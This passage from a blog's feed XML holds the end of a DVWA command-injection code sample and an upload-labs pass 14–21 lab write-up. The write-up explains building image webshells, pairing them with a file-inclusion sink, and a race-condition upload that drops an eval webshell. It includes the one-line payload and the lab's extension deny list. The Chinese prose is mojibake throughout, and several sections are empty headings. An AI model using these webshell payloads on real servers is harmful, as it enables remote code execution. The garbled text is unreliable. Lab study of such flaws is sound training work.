class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">&quot;.&quot;</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;å‘½ä»¤æ³¨å…¥â€”â€”åˆ©ç”¨å¯ä»¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„webåº”ç”¨ï¼Œé€šè¿‡æ„é€ ç‰¹æ®Šå‘½ä»¤å­—ç¬¦ä¸²çš„æ–¹å¼ï¼ŒæŠŠæ¶æ„ä»£ç è¾“å…¥ä¸€ä¸ªç¼–è¾‘åŸŸ(ä¾‹å¦‚ç¼ºä¹æœ‰æ•ˆéªŒè¯çš„è¾“å…¥æ¡†)æ¥æ”¹</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-pass14-21</title>
    <link href="http://example.com/2021/02/20/upload-labs-pass14-21/"/>
    <id>http://example.com/2021/02/20/upload-labs-pass14-21/</id>
    <published>2021-02-20T04:27:30.000Z</published>
    <updated>2021-02-25T12:23:46.993Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä»pass-14å¼€å§‹éƒ½æ˜¯å›¾ç‰‡é©¬æ­é…æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p><ul><li><strong>å›¾ç‰‡é©¬çš„åˆ¶ä½œ</strong></li></ul><p>ä½¿ç”¨cmdåˆ¶ä½œå›¾ç‰‡é©¬ï¼š<strong>copy 1.jpg/b+1.php 2.jpg</strong>â€”â€”æ„æ€æ˜¯å°†1.jpgä»¥äºŒè¿›åˆ¶æ–¹å¼ä¸1.phpåˆå¹¶æˆ2.jpgï¼Œè¿™ä¸ª2.jpgå°±æ˜¯å›¾ç‰‡é©¬äº†ã€‚</p><ul><li><strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong></li></ul><p>-ã€‹æ–‡ä»¶åŒ…å«ç®€ä»‹ï¼šæœåŠ¡å™¨æ‰§è¡ŒPHPæ–‡ä»¶æ—¶ï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½å¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„PHPä»£ç ï¼Œå¹¶ä¸”å½“ä½œPHPæ¥æ‰§è¡Œã€‚</p><p>-ã€‹æ–‡ä»¶åŒ…å«å‡½æ•°ï¼šPHPä¸­æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§ï¼š</p><p>1.require()ï¼›2.require_once()ï¼›3.include()ï¼›4.include_once()</p><p><code>include</code>å’Œ<code>require</code>åŒºåˆ«ä¸»è¦æ˜¯ï¼Œ<code>include</code>åœ¨åŒ…å«çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œç¨‹åºç»§ç»­æ­£å¸¸è¿è¡Œï¼›è€Œ<code>require</code>å‡½æ•°å‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œä¼šç›´æ¥æŠ¥é”™å¹¶é€€å‡ºç¨‹åºçš„æ‰§è¡Œã€‚</p><p>è€Œ<code>include_once()</code>ï¼Œ<code>require_once()</code>è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œä¸å‰ä¸¤ä¸ªçš„ä¸åŒä¹‹å¤„åœ¨äºè¿™ä¸¤ä¸ªå‡½æ•°åªåŒ…å«ä¸€æ¬¡ï¼Œé€‚ç”¨äºåœ¨è„šæœ¬æ‰§è¡ŒæœŸé—´åŒä¸€ä¸ªæ–‡ä»¶æœ‰å¯èƒ½è¢«åŒ…æ‹¬è¶…è¿‡ä¸€æ¬¡çš„æƒ…å†µä¸‹ï¼Œä½ æƒ³ç¡®ä¿å®ƒåªè¢«åŒ…æ‹¬ä¸€æ¬¡ä»¥é¿å…å‡½æ•°é‡å®šä¹‰ï¼Œå˜é‡é‡æ–°èµ‹å€¼ç­‰é—®é¢˜ã€‚</p><p>-ã€‹æ–‡ä»¶åŒ…å«æ¼æ´åŸç†ï¼šæ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–è€…ä¸¥æ ¼çš„å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œäº†éé¢„æœŸçš„ä»£ç ã€‚</p><p>ç¤ºä¾‹ä»£ç ï¼š</p><ol><li><pre><code class="php"> &lt;?php     $filename  = $_GET[&#39;filename&#39;];     include($filename); ?&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å‚è€ƒèµ„æ–™ï¼šhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;Vansnc&#x2F;article&#x2F;details&#x2F;82528395</span><br><span class="line"></span><br><span class="line"># pass-14ï¼šæ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡</span><br><span class="line"></span><br><span class="line">* æŸ¥çœ‹æºç ï¼Œå‘ç°æœåŠ¡å™¨åªæ£€æŸ¥æ–‡ä»¶å†…å®¹çš„å‰ä¸¤ä¸ªå­—èŠ‚</span><br><span class="line"></span><br><span class="line">è¡¥å……ï¼šä¸€èˆ¬æ–‡ä»¶å†…å®¹çš„å‰ä¸¤ä¸ªå­—èŠ‚ä¼šä½“ç°å‡ºè‡ªå·±æ˜¯ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼ˆå¯ä»¥ç”¨winhexæŸ¥çœ‹ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">å› æ­¤æœ¬passç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡äº†ã€‚</span><br><span class="line"></span><br><span class="line">* å›¾ç‰‡é©¬çš„åˆ©ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">  ä¸€èˆ¬å›¾ç‰‡é©¬æ˜¯æ— æ³•ç›´æ¥è¿æ¥èšå‰‘çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ­é…æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ“ä½œæœåŠ¡å™¨ã€‚ç‚¹å¼€pass-14æ³¨æ„2çš„æ–‡ä»¶åŒ…å«æ¼æ´ç½‘é¡µï¼Œurlæ è¾“å…¥ï¼š?file&#x3D;.&#x2F;upload&#x2F;æ–‡ä»¶å![2](upload-labs-pass14&#x2F;2.png)</span><br><span class="line"></span><br><span class="line"># pass-15ï¼šçªç ´getimagesize()</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æºç ï¼š</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);&#x2F;&#x2F;æ ¹æ®ç´¢å¼•2çš„å€¼è½¬æ¢ä¸ºå¯¹åº”åç¼€</span><br><span class="line">        if(stripos($types,$ext)&gt;&#x3D;0)&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></code></pre></li></ol><ul><li><strong>æ–°å‡½æ•°ï¼š</strong></li></ul><p>â€”ï¼‰getimagesize()</p><p>åŠŸèƒ½ï¼šç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ˆæˆå‘˜ä¸ºç´¢å¼•0ã€1ã€2ã€3ç­‰ç­‰ï¼‰ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚</p><ol><li>ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼</li><li>ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼</li><li>ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 = BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM</li><li>ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ &lt;imageæ ‡ç­¾</li></ol><p>èœé¸Ÿæ•™ç¨‹å®ä¾‹ï¼š<img src="/upload-labs-pass14/3.png" alt="3"></p><p>é‚£ä¹ˆè¿™å…³ä¹Ÿæ˜¯ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡ã€‚</p><h1 id="pass-16ï¼šçªç ´exif-imagetype"><a href="#pass-16ï¼šçªç ´exif-imagetype" class="headerlink" title="pass-16ï¼šçªç ´exif_imagetype()"></a>pass-16ï¼šçªç ´exif_imagetype()</h1><ul><li><p>exif_imagetype()å‡½æ•°ï¼š</p><p>åŠŸèƒ½ï¼šè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚è¿™ä¸ªç­¾åï¼ˆä¹Ÿå¯ä»¥ç§°ä¸ºå€¼ï¼‰å’Œ getimagesize() è¿”å›çš„æ•°ç»„ä¸­çš„ç´¢å¼• 2 çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æœ¬å‡½æ•°å¿«å¾—å¤šã€‚</p></li></ul><p><img src="/upload-labs-pass14/4.png" alt="4"></p><p>é‚£ä¹ˆè¿™å…³ä¹Ÿæ˜¯ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡ã€‚</p><h1 id="pass-17ï¼šäºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#pass-17ï¼šäºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="pass-17ï¼šäºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>pass-17ï¼šäºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h1><h1 id="pass-18ï¼šæ¡ä»¶ç«äº‰â€”â€”æ—¶é—´å‹"><a href="#pass-18ï¼šæ¡ä»¶ç«äº‰â€”â€”æ—¶é—´å‹" class="headerlink" title="pass-18ï¼šæ¡ä»¶ç«äº‰â€”â€”æ—¶é—´å‹"></a>pass-18ï¼šæ¡ä»¶ç«äº‰â€”â€”æ—¶é—´å‹</h1><ul><li>ä»£ç å®¡è®¡ï¼šæœåŠ¡å™¨å…ˆä¸Šä¼ äº†å›¾ç‰‡ï¼Œå†åˆ¤æ–­åç¼€æ˜¯å¦ç¬¦åˆï¼Œç¬¦åˆåˆ™é‡å‘½åï¼Œä¸ç¬¦åˆåˆ™åˆ é™¤ã€‚</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨æˆ‘ä»¬ä¸Šä¼ äº†ä¸ç¬¦åˆçš„å›¾ç‰‡æœåŠ¡å™¨ä¿å­˜åˆ°å…¶åˆ é™¤è‚¯å®šä¼šæœ‰æ—¶é—´å·®çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€æ—¶é—´å·®è¿›è¡Œæˆ‘ä»¬çš„æ“ä½œï¼šä¸Šä¼ æ–°çš„ä¸€å¥è¯æœ¨é©¬ï¼š</p><p>&lt; ?php fputs(fopen(â€˜shell.phpâ€™,â€™wâ€™),â€™&lt; ?php @eval($_POST[â€œpassâ€])?&gt;â€™);?&gt;</p><ul><li><p>æ–°å‡½æ•°ï¼š</p><p>â€”ï¼‰<strong>fputs() å‡½æ•°</strong>â€”â€”åˆ«åfwrite</p><p>åŠŸèƒ½ï¼šå†™å…¥æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</p><p>è¯­æ³•ï¼šfputs(file,string,length)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>file</td><td>å¿…éœ€ã€‚è§„å®šè¦å†™å…¥çš„æ‰“å¼€æ–‡ä»¶ã€‚</td></tr><tr><td>string</td><td>å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td>length</td><td>å¯é€‰ã€‚è§„å®šè¦å†™å…¥çš„æœ€å¤§å­—èŠ‚æ•°ã€‚</td></tr></tbody></table><p>â€”ï¼‰<strong>fopen()å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šæ‰“å¼€æ–‡ä»¶æˆ–è€… URLã€‚</p><p>è¯­æ³•ï¼šfopen(filename,mode,include_path,context)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>filename</td><td>å¿…éœ€ã€‚è§„å®šè¦æ‰“å¼€çš„æ–‡ä»¶æˆ– URLã€‚</td></tr><tr><td>mode</td><td>å¿…éœ€ã€‚è§„å®šè¦æ±‚åˆ°è¯¥æ–‡ä»¶/æµçš„è®¿é—®ç±»å‹ã€‚å¯èƒ½çš„å€¼è§ä¸‹è¡¨ã€‚</td></tr><tr><td>include_path</td><td>å¯é€‰ã€‚å¦‚æœä¹Ÿéœ€è¦åœ¨ include_path ä¸­æ£€ç´¢æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥å°†è¯¥å‚æ•°è®¾ä¸º 1 æˆ– TRUEã€‚</td></tr><tr><td>context</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚Context æ˜¯å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„ä¸€å¥—é€‰é¡¹ã€‚</td></tr></tbody></table></li></ul><p>å…¶ä¸­modeå¯é€‰çš„ç±»å‹æœ‰ï¼š</p><table><thead><tr><th align="left">mode</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">â€œrâ€</td><td align="left">åªè¯»æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚</td></tr><tr><td align="left">â€œr+â€</td><td align="left">è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚</td></tr><tr><td align="left">â€œwâ€</td><td align="left">å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´å¹¶å°†æ–‡ä»¶å¤§å°æˆªä¸ºé›¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚</td></tr><tr><td align="left">â€œw+â€</td><td align="left">è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´å¹¶å°†æ–‡ä»¶å¤§å°æˆªä¸ºé›¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚</td></tr><tr><td align="left">â€œaâ€</td><td align="left">å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æœ«å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚</td></tr><tr><td align="left">â€œa+â€</td><td align="left">è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æœ«å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚</td></tr><tr><td align="left">â€œxâ€</td><td align="left">åˆ›å»ºå¹¶ä»¥å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ fopen() è°ƒç”¨å¤±è´¥å¹¶è¿”å› FALSEï¼Œå¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§åˆ«çš„é”™è¯¯ä¿¡æ¯ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚è¿™å’Œç»™åº•å±‚çš„ open(2) ç³»ç»Ÿè°ƒç”¨æŒ‡å®š O_EXCL|O_CREAT æ ‡è®°æ˜¯ç­‰ä»·çš„ã€‚æ­¤é€‰é¡¹è¢« PHP 4.3.2 ä»¥åŠä»¥åçš„ç‰ˆæœ¬æ‰€æ”¯æŒï¼Œä»…èƒ½ç”¨äºæœ¬åœ°æ–‡ä»¶ã€‚</td></tr><tr><td align="left">â€œx+â€</td><td align="left">åˆ›å»ºå¹¶ä»¥è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ fopen() è°ƒç”¨å¤±è´¥å¹¶è¿”å› FALSEï¼Œå¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§åˆ«çš„é”™è¯¯ä¿¡æ¯ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚è¿™å’Œç»™åº•å±‚çš„ open(2) ç³»ç»Ÿè°ƒç”¨æŒ‡å®š O_EXCL|O_CREAT æ ‡è®°æ˜¯ç­‰ä»·çš„ã€‚æ­¤é€‰é¡¹è¢« PHP 4.3.2 ä»¥åŠä»¥åçš„ç‰ˆæœ¬æ‰€æ”¯æŒï¼Œä»…èƒ½ç”¨äºæœ¬åœ°æ–‡ä»¶ã€‚</td></tr></tbody></table><ul><li>æŠŠè¿™ä¸ªphpæ–‡ä»¶é€šè¿‡burpä¸€ç›´ä¸åœçš„ä¸Šä¼ ï¼Œæ€»ä¼šæœ‰é‚£ä¹ˆä¸€ç¬é—´æ˜¯è¿˜æ²¡æ¥å¾—åŠåˆ é™¤å°±å¯ä»¥è¢«è®¿é—®åˆ°çš„ï¼ˆå¯ä»¥é€šè¿‡å¢åŠ burpsuiteçº¿ç¨‹æ¥æé«˜å‡ ç‡ï¼‰ï¼Œä¸€æ—¦è®¿é—®åˆ°è¯¥æ–‡ä»¶å°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªwebshell2.0.phpçš„ä¸€å¥è¯ï¼Œç„¶åç”¨èšå‰‘è¿æ¥shell.phpå³å¯ã€‚</li></ul><h1 id="pass-19ï¼šæ¡ä»¶ç«äº‰"><a href="#pass-19ï¼šæ¡ä»¶ç«äº‰" class="headerlink" title="pass-19ï¼šæ¡ä»¶ç«äº‰"></a>pass-19ï¼šæ¡ä»¶ç«äº‰</h1><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><ul><li>ä»£ç å®¡è®¡ï¼š</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">       $is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>æ–°å‡½æ•°ï¼š</li></ul><p>â€”ï¼‰<strong>pathinfo()å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯</p><p>è¯­æ³•ï¼špathinfo(path,process_sections)</p><table><thead><tr><th align="left">å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td align="left">path</td><td>å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</td></tr><tr><td align="left">process_sections</td><td>å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„æ•°ç»„å…ƒç´ ã€‚é»˜è®¤æ˜¯ allã€‚å¯èƒ½çš„å€¼ï¼šPATHINFO_DIRNAME - åªè¿”å› dirnameï¼ˆç›®å½•è·¯å¾„ï¼‰PATHINFO_BASENAME - åªè¿”å› basenameï¼ˆæ–‡ä»¶åï¼‰PATHINFO_EXTENSION - åªè¿”å› extensionï¼ˆæ–‡ä»¶ååç¼€ï¼‰</td></tr></tbody></table><p>æ„Ÿè§‰è¿™å…³å°±æ˜¯å‰é¢çš„é»‘åå•ç»•è¿‡ï¼Œæ‰“ç»„åˆæ‹³å°±å¥½äº†ã€‚</p><h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><ul><li><strong>ä»£ç å®¡è®¡ï¼š</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 